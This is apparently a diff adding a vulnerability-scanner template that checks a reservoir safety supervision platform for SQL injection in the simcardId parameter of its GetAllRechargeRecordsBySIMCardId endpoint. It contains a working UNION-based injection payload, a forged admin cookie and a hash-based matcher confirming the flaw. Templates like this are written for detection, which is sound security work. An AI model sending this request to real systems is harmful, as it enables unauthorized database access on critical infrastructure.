@@ -1,0 +1,37 @@
+id: sql-injection-pingsheng-reservoir
+
+info:
+  name: SQL Injection in Pingsheng Reservoir Safety Platform
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The simcardId parameter in the Pingsheng Reservoir Safety Supervision platform's endpoint /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands and retrieve sensitive information.
+  tags: sql-injection
+  classification:
+    cvss-score: 8.6
+
+variables:
+  sql_payload: "1,1,1,1,substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32),1--"
+
+http:
+  - raw:
+      - |
+        POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: currentuser=username=admin; usercookiename=usernames=admin;
+
+        loginIdentifer=123&simcardId=123'+UNION+ALL+SELECT+{{sql_payload}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
+        part: body
